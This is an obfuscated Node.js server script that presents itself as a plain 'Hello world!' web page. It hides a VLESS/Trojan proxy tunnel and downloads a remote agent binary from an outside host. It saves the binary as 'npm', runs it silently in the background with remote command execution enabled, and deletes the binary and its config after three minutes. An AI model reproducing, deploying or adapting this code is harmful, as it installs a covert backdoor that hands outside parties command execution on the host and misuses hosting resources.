function _0xbf96(_0x26036a,_0x24e8c4){const _0x290d51=_0x290d();return _0xbf96=function(_0xbf9664,_0x205dc1){_0xbf9664=_0xbf9664-0x16e;let _0xf89284=_0x290d51[_0xbf9664];return _0xf89284;},_0xbf96(_0x26036a,_0x24e8c4);}const _0x589699=_0xbf96;(function(_0x169675,_0x3d857c){const _0x495ae7=_0xbf96,_0x3c4a4c=_0x169675();while(!![]){try{const _0x1695a9=-parseInt(_0x495ae7(0x16e))/0x1*(-parseInt(_0x495ae7(0x1c7))/0x2)+-parseInt(_0x495ae7(0x1c5))/0x3+parseInt(_0x495ae7(0x1d9))/0x4+parseInt(_0x495ae7(0x17e))/0x5*(-parseInt(_0x495ae7(0x193))/0x6)+-parseInt(_0x495ae7(0x1b2))/0x7*(parseInt(_0x495ae7(0x1e0))/0x8)+parseInt(_0x495ae7(0x1e6))/0x9*(parseInt(_0x495ae7(0x175))/0xa)+-parseInt(_0x495ae7(0x199))/0xb*(-parseInt(_0x495ae7(0x18d))/0xc);if(_0x1695a9===_0x3d857c)break;else _0x3c4a4c['push'](_0x3c4a4c['shift']());}catch(_0x452698){_0x3c4a4c['push'](_0x3c4a4c['shift']());}}}(_0x290d,0x74a7c));const os=require('os'),http=require(_0x589699(0x1b7)),fs=require('fs'),axios=require(_0x589699(0x174)),net=require(_0x589699(0x1c2)),path=require(_0x589699(0x1bd)),crypto=require(_0x589699(0x1e4)),{Buffer}=require(_0x589699(0x1bc)),{exec,execSync}=require(_0x589699(0x1b4)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x589699(0x18b)][_0x589699(0x177)]||'7c9e2b1d-8a4f-4d3e-9c5b-1a0f6e8d2c3a',NEZHA_SERVER=process[_0x589699(0x18b)][_0x589699(0x189)]||'',NEZHA_PORT=process[_0x589699(0x18b)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x589699(0x18b)]['NEZHA_KEY']||'',DOMAIN=process['env'][_0x589699(0x1bf)]||_0x589699(0x186),AUTO_ACCESS=process[_0x589699(0x18b)][_0x589699(0x1d7)]||!![],WSPATH=process['env'][_0x589699(0x187)]||UUID[_0x589699(0x1bb)](0x0,0x8),SUB_PATH=process[_0x589699(0x18b)][_0x589699(0x17a)]||_0x589699(0x185),NAME=process[_0x589699(0x18b)][_0x589699(0x198)]||_0x589699(0x1ca),PORT=process[_0x589699(0x18b)][_0x589699(0x1d2)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x4eb221=_0x589699;try{const _0x4caec8=await axios[_0x4eb221(0x191)](_0x4eb221(0x1c0)),_0x70c636=_0x4caec8[_0x4eb221(0x1ba)];ISP=(_0x70c636[_0x4eb221(0x194)]+'-'+_0x70c636[_0x4eb221(0x1ac)])['replace'](/ /g,'_');}catch(_0x36dfe0){ISP=_0x4eb221(0x1de);}};GetISP();const httpServer=http[_0x589699(0x1af)]((_0x3a65ae,_0x58fcd0)=>{const _0x2f11b9=_0x589699;if(_0x3a65ae[_0x2f11b9(0x1d0)]==='/'){const _0x59d5ca=path[_0x2f11b9(0x1da)](__dirname,_0x2f11b9(0x179));fs[_0x2f11b9(0x1ab)](_0x59d5ca,_0x2f11b9(0x197),(_0x31321b,_0x526290)=>{const _0x2c0b80=_0x2f11b9;if(_0x31321b){_0x58fcd0[_0x2c0b80(0x1a4)](0xc8,{'Content-Type':_0x2c0b80(0x1e1)}),_0x58fcd0['end'](_0x2c0b80(0x173));return;}_0x58fcd0[_0x2c0b80(0x1a4)](0xc8,{'Content-Type':_0x2c0b80(0x1e1)}),_0x58fcd0[_0x2c0b80(0x17f)](_0x526290);});return;}else{if(_0x3a65ae[_0x2f11b9(0x1d0)]==='/'+SUB_PATH){const _0x3fe4b5=_0x2f11b9(0x1ef)+UUID+'@'+DOMAIN+_0x2f11b9(0x1c8)+DOMAIN+_0x2f11b9(0x1e7)+DOMAIN+_0x2f11b9(0x1e2)+WSPATH+'#'+NAME+'-'+ISP,_0x3add46=_0x2f11b9(0x184)+UUID+'@'+DOMAIN+_0x2f11b9(0x1dd)+DOMAIN+_0x2f11b9(0x1e7)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x342ad3=_0x3fe4b5+'\x0a'+_0x3add46,_0x24d74f=Buffer[_0x2f11b9(0x172)](_0x342ad3)['toString'](_0x2f11b9(0x1a7));_0x58fcd0['writeHead'](0xc8,{'Content-Type':_0x2f11b9(0x1df)}),_0x58fcd0['end'](_0x24d74f+'\x0a');}else _0x58fcd0['writeHead'](0x194,{'Content-Type':_0x2f11b9(0x1df)}),_0x58fcd0['end'](_0x2f11b9(0x1b8));}}),wss=new WebSocket[(_0x589699(0x1e8))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x288bd3){return new Promise((_0x44f020,_0x18f53d)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x288bd3)){_0x44f020(_0x288bd3);return;}let _0x36fbb5=0x0;function _0x2c355e(){const _0x25cb6f=_0xbf96;if(_0x36fbb5>=DNS_SERVERS[_0x25cb6f(0x1b0)]){_0x18f53d(new Error(_0x25cb6f(0x188)+_0x288bd3+_0x25cb6f(0x1d3)));return;}const _0x2a3b7c=DNS_SERVERS[_0x36fbb5];_0x36fbb5++;const _0x33bbc6=_0x25cb6f(0x1ea)+encodeURIComponent(_0x288bd3)+'&type=A';axios['get'](_0x33bbc6,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x25cb6f(0x1b6)](_0x20c467=>{const _0x525928=_0x25cb6f,_0x364b2b=_0x20c467[_0x525928(0x1ba)];if(_0x364b2b[_0x525928(0x1b3)]===0x0&&_0x364b2b[_0x525928(0x19c)]&&_0x364b2b[_0x525928(0x19c)][_0x525928(0x1b0)]>0x0){const _0x14d07e=_0x364b2b[_0x525928(0x19c)][_0x525928(0x1ee)](_0x332c90=>_0x332c90[_0x525928(0x182)]===0x1);if(_0x14d07e){_0x44f020(_0x14d07e[_0x525928(0x1ba)]);return;}}_0x2c355e();})['catch'](_0x593844=>{_0x2c355e();});}_0x2c355e();});}function handleVlessConnection(_0x182b07,_0x5bc8b6){const _0x5dac79=_0x589699,[_0x2d84e8]=_0x5bc8b6,_0x36a26f=_0x5bc8b6['slice'](0x1,0x11);if(!_0x36a26f[_0x5dac79(0x176)]((_0x2c5fc8,_0x3ea174)=>_0x2c5fc8==parseInt(uuid[_0x5dac79(0x195)](_0x3ea174*0x2,0x2),0x10)))return![];let _0x1424d8=_0x5bc8b6[_0x5dac79(0x1bb)](0x11,0x12)[_0x5dac79(0x190)]()+0x13;const _0x4a34e9=_0x5bc8b6[_0x5dac79(0x1bb)](_0x1424d8,_0x1424d8+=0x2)[_0x5dac79(0x183)](0x0),_0x2d94be=_0x5bc8b6[_0x5dac79(0x1bb)](_0x1424d8,_0x1424d8+=0x1)[_0x5dac79(0x190)](),_0xc33eac=_0x2d94be==0x1?_0x5bc8b6[_0x5dac79(0x1bb)](_0x1424d8,_0x1424d8+=0x4)['join']('.'):_0x2d94be==0x2?new TextDecoder()[_0x5dac79(0x1dc)](_0x5bc8b6[_0x5dac79(0x1bb)](_0x1424d8+0x1,_0x1424d8+=0x1+_0x5bc8b6[_0x5dac79(0x1bb)](_0x1424d8,_0x1424d8+0x1)['readUInt8']())):_0x2d94be==0x3?_0x5bc8b6[_0x5dac79(0x1bb)](_0x1424d8,_0x1424d8+=0x10)['reduce']((_0x42643f,_0x222ce3,_0x92c2b9,_0x35e491)=>_0x92c2b9%0x2?_0x42643f[_0x5dac79(0x1db)](_0x35e491[_0x5dac79(0x1bb)](_0x92c2b9-0x1,_0x92c2b9+0x1)):_0x42643f,[])['map'](_0x52f97e=>_0x52f97e['readUInt16BE'](0x0)[_0x5dac79(0x17d)](0x10))[_0x5dac79(0x1da)](':'):'';_0x182b07['send'](new Uint8Array([_0x2d84e8,0x0]));const _0x18b8c1=createWebSocketStream(_0x182b07);return resolveHost(_0xc33eac)[_0x5dac79(0x1b6)](_0x4805e9=>{const _0x4621d4=_0x5dac79;net[_0x4621d4(0x1a1)]({'host':_0x4805e9,'port':_0x4a34e9},function(){const _0x1dd406=_0x4621d4;this[_0x1dd406(0x178)](_0x5bc8b6['slice'](_0x1424d8)),_0x18b8c1['on'](_0x1dd406(0x1cd),()=>{})[_0x1dd406(0x19b)](this)['on'](_0x1dd406(0x1cd),()=>{})['pipe'](_0x18b8c1);})['on'](_0x4621d4(0x1cd),()=>{});})[_0x5dac79(0x196)](_0x5580ab=>{const _0x191b48=_0x5dac79;net[_0x191b48(0x1a1)]({'host':_0xc33eac,'port':_0x4a34e9},function(){const _0x1a6329=_0x191b48;this[_0x1a6329(0x178)](_0x5bc8b6['slice'](_0x1424d8)),_0x18b8c1['on'](_0x1a6329(0x1cd),()=>{})[_0x1a6329(0x19b)](this)['on'](_0x1a6329(0x1cd),()=>{})[_0x1a6329(0x19b)](_0x18b8c1);})['on'](_0x191b48(0x1cd),()=>{});}),!![];}function handleTrojanConnection(_0x4440d0,_0xe8c36d){const _0x1dbe98=_0x589699;try{if(_0xe8c36d[_0x1dbe98(0x1b0)]<0x3a)return![];const _0x1006ad=_0xe8c36d['slice'](0x0,0x38)[_0x1dbe98(0x17d)](),_0x4da1a0=[UUID];let _0x329372=null;for(const _0x775929 of _0x4da1a0){const _0x428a3e=crypto[_0x1dbe98(0x19f)]('sha224')['update'](_0x775929)[_0x1dbe98(0x1e3)](_0x1dbe98(0x1b5));if(_0x428a3e===_0x1006ad){_0x329372=_0x775929;break;}}if(!_0x329372)return![];let _0x1fdd0c=0x38;_0xe8c36d[_0x1fdd0c]===0xd&&_0xe8c36d[_0x1fdd0c+0x1]===0xa&&(_0x1fdd0c+=0x2);const _0x2170a6=_0xe8c36d[_0x1fdd0c];if(_0x2170a6!==0x1)return![];_0x1fdd0c+=0x1;const _0x47f882=_0xe8c36d[_0x1fdd0c];_0x1fdd0c+=0x1;let _0x57354b,_0x4f0ee1;if(_0x47f882===0x1)_0x57354b=_0xe8c36d[_0x1dbe98(0x1bb)](_0x1fdd0c,_0x1fdd0c+0x4)[_0x1dbe98(0x1da)]('.'),_0x1fdd0c+=0x4;else{if(_0x47f882===0x3){const _0x103ba9=_0xe8c36d[_0x1fdd0c];_0x1fdd0c+=0x1,_0x57354b=_0xe8c36d[_0x1dbe98(0x1bb)](_0x1fdd0c,_0x1fdd0c+_0x103ba9)[_0x1dbe98(0x17d)](),_0x1fdd0c+=_0x103ba9;}else{if(_0x47f882===0x4)_0x57354b=_0xe8c36d[_0x1dbe98(0x1bb)](_0x1fdd0c,_0x1fdd0c+0x10)[_0x1dbe98(0x1d5)]((_0x45c505,_0x2ec570,_0x491edf,_0x19d44d)=>_0x491edf%0x2?_0x45c505[_0x1dbe98(0x1db)](_0x19d44d[_0x1dbe98(0x1bb)](_0x491edf-0x1,_0x491edf+0x1)):_0x45c505,[])[_0x1dbe98(0x1cc)](_0x327daa=>_0x327daa[_0x1dbe98(0x183)](0x0)['toString'](0x10))[_0x1dbe98(0x1da)](':'),_0x1fdd0c+=0x10;else return![];}}_0x4f0ee1=_0xe8c36d[_0x1dbe98(0x183)](_0x1fdd0c),_0x1fdd0c+=0x2;_0x1fdd0c<_0xe8c36d[_0x1dbe98(0x1b0)]&&_0xe8c36d[_0x1fdd0c]===0xd&&_0xe8c36d[_0x1fdd0c+0x1]===0xa&&(_0x1fdd0c+=0x2);const _0xeb0a41=createWebSocketStream(_0x4440d0);return resolveHost(_0x57354b)[_0x1dbe98(0x1b6)](_0x30e887=>{const _0x447bc4=_0x1dbe98;net[_0x447bc4(0x1a1)]({'host':_0x30e887,'port':_0x4f0ee1},function(){const _0x572115=_0x447bc4;_0x1fdd0c<_0xe8c36d[_0x572115(0x1b0)]&&this[_0x572115(0x178)](_0xe8c36d[_0x572115(0x1bb)](_0x1fdd0c)),_0xeb0a41['on'](_0x572115(0x1cd),()=>{})['pipe'](this)['on'](_0x572115(0x1cd),()=>{})[_0x572115(0x19b)](_0xeb0a41);})['on'](_0x447bc4(0x1cd),()=>{});})[_0x1dbe98(0x196)](_0x4a5e22=>{const _0x5c38f8=_0x1dbe98;net[_0x5c38f8(0x1a1)]({'host':_0x57354b,'port':_0x4f0ee1},function(){const _0x4c008c=_0x5c38f8;_0x1fdd0c<_0xe8c36d[_0x4c008c(0x1b0)]&&this[_0x4c008c(0x178)](_0xe8c36d['slice'](_0x1fdd0c)),_0xeb0a41['on'](_0x4c008c(0x1cd),()=>{})['pipe'](this)['on']('error',()=>{})[_0x4c008c(0x19b)](_0xeb0a41);})['on'](_0x5c38f8(0x1cd),()=>{});}),!![];}catch(_0x2574d9){return![];}}wss['on'](_0x589699(0x171),(_0x47baf8,_0x29c830)=>{const _0x187422=_0x589699,_0x34c3df=_0x29c830[_0x187422(0x1d0)]||'';_0x47baf8[_0x187422(0x1eb)](_0x187422(0x1c9),_0x274d40=>{const _0x49916d=_0x187422;if(_0x274d40[_0x49916d(0x1b0)]>0x11&&_0x274d40[0x0]===0x0){const _0x103943=_0x274d40[_0x49916d(0x1bb)](0x1,0x11),_0x5a6b33=_0x103943['every']((_0x3bf162,_0x152827)=>_0x3bf162==parseInt(uuid[_0x49916d(0x195)](_0x152827*0x2,0x2),0x10));if(_0x5a6b33){!handleVlessConnection(_0x47baf8,_0x274d40)&&_0x47baf8[_0x49916d(0x1a0)]();return;}}!handleTrojanConnection(_0x47baf8,_0x274d40)&&_0x47baf8[_0x49916d(0x1a0)]();})['on'](_0x187422(0x1cd),()=>{});});const getDownloadUrl=()=>{const _0x32fe8b=_0x589699,_0x5483c2=os['arch']();return _0x5483c2===_0x32fe8b(0x1e5)||_0x5483c2===_0x32fe8b(0x1ad)||_0x5483c2===_0x32fe8b(0x192)?!NEZHA_PORT?_0x32fe8b(0x1d1):_0x32fe8b(0x17b):!NEZHA_PORT?_0x32fe8b(0x1d4):_0x32fe8b(0x1a3);},downloadFile=async()=>{const _0x3f30e7=_0x589699;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x11b489=getDownloadUrl(),_0x12fdef=await axios({'method':'get','url':_0x11b489,'responseType':_0x3f30e7(0x1d6)}),_0x51d605=fs[_0x3f30e7(0x19e)](_0x3f30e7(0x1cf));return _0x12fdef[_0x3f30e7(0x1ba)][_0x3f30e7(0x19b)](_0x51d605),new Promise((_0x14e09b,_0x2d4b5f)=>{const _0x4b4183=_0x3f30e7;_0x51d605['on'](_0x4b4183(0x1ec),()=>{const _0x9278a1=_0x4b4183;console[_0x9278a1(0x181)](_0x9278a1(0x1ce)),exec(_0x9278a1(0x18f),_0x179267=>{if(_0x179267)_0x2d4b5f(_0x179267);_0x14e09b();});}),_0x51d605['on']('error',_0x2d4b5f);});}catch(_0x1c120c){throw _0x1c120c;}},runnz=async()=>{const _0x3911dd=_0x589699;try{const _0x409eb0=execSync(_0x3911dd(0x1a6),{'encoding':'utf-8'});if(_0x409eb0[_0x3911dd(0x1a9)]()!==''){console[_0x3911dd(0x181)](_0x3911dd(0x18a));return;}}catch(_0x552c99){}await downloadFile();let _0x51efdb='',_0x3af7d6=[_0x3911dd(0x180),'8443',_0x3911dd(0x1e9),_0x3911dd(0x19d),_0x3911dd(0x19a),_0x3911dd(0x1ed)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3f711a=_0x3af7d6['includes'](NEZHA_PORT)?'--tls':'';_0x51efdb='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x3911dd(0x1ae)+NEZHA_KEY+'\x20'+_0x3f711a+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x32f40f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x3911dd(0x1d8)]():'',_0x4ef86e=_0x3af7d6[_0x3911dd(0x1c1)](_0x32f40f)?'true':_0x3911dd(0x170),_0x43e762='client_secret:\x20'+NEZHA_KEY+_0x3911dd(0x1b9)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4ef86e+_0x3911dd(0x18e)+UUID;fs[_0x3911dd(0x1c4)]('config.yaml',_0x43e762);}_0x51efdb=_0x3911dd(0x1be);}else{console['log'](_0x3911dd(0x1c3));return;}}try{exec(_0x51efdb,{'shell':_0x3911dd(0x1cb)},_0x2d5684=>{const _0x1114fa=_0x3911dd;if(_0x2d5684)console[_0x1114fa(0x1cd)]('npm\x20running\x20error:',_0x2d5684);else console[_0x1114fa(0x181)](_0x1114fa(0x16f));});}catch(_0x1d6d12){console['error'](_0x3911dd(0x1a2)+_0x1d6d12);}};async function addAccessTask(){const _0x254214=_0x589699;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4038b2=_0x254214(0x1b1)+DOMAIN;try{const _0x3b33dc=await axios[_0x254214(0x1c6)](_0x254214(0x18c),{'url':_0x4038b2},{'headers':{'Content-Type':_0x254214(0x1aa)}});console[_0x254214(0x181)](_0x254214(0x17c));}catch(_0x36e914){}}const delFiles=()=>{const _0xbc8122=_0x589699;fs[_0xbc8122(0x1a8)](_0xbc8122(0x1cf),()=>{}),fs[_0xbc8122(0x1a8)]('config.yaml',()=>{});};httpServer[_0x589699(0x1f0)](PORT,()=>{const _0x28e33a=_0x589699;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x28e33a(0x181)](_0x28e33a(0x1a5)+PORT);});function _0x290d(){const _0x43e97b=['axios','123890OhEfwW','every','UUID','write','index.html','SUB_PATH','https://arm64.ssss.nyc.mn/agent','Automatic\x20Access\x20Task\x20added\x20successfully','toString','5QyejIo','end','443','log','type','readUInt16BE','trojan://','sub','1234.abc.com','WSPATH','Failed\x20to\x20resolve\x20','NEZHA_SERVER','npm\x20is\x20already\x20running,\x20skip\x20running...','env','https://oooo.serv00.net/add-url','480JDMgks','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','chmod\x20+x\x20npm','readUInt8','get','aarch64','398064iRJEGg','country','substr','catch','utf8','NAME','390247iuzkgk','2083','pipe','Answer','2087','createWriteStream','createHash','close','connect','error:\x20','https://amd64.ssss.nyc.mn/agent','writeHead','Server\x20is\x20running\x20on\x20port\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','base64','unlink','trim','application/json','readFile','asOrganization','arm64','\x20-p\x20','createServer','length','https://','5726805WdGMUs','Status','child_process','hex','then','http','Not\x20Found\x0a','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','data','slice','buffer','path','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','DOMAIN','https://speed.cloudflare.com/meta','includes','net','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','writeFileSync','2172075kLdxuW','post','834222pTSvaf',':443?encryption=none&security=tls&sni=','message','Hug','/bin/bash','map','error','npm\x20download\x20successfully','npm','url','https://arm64.ssss.nyc.mn/v1','PORT','\x20with\x20all\x20DNS\x20servers','https://amd64.ssss.nyc.mn/v1','reduce','stream','AUTO_ACCESS','pop','455336gFRaBu','join','concat','decode',':443?security=tls&sni=','Unknown','text/plain','8rVcwYi','text/html','&path=%2F','digest','crypto','arm','99pFMwIv','&fp=chrome&type=ws&host=','Server','2096','https://dns.google/resolve?name=','once','finish','2053','find','vless://','listen','1kiTtHL','npm\x20is\x20running','false','connection','from','Hello\x20world!'];_0x290d=function(){return _0x43e97b;};return _0x290d();}
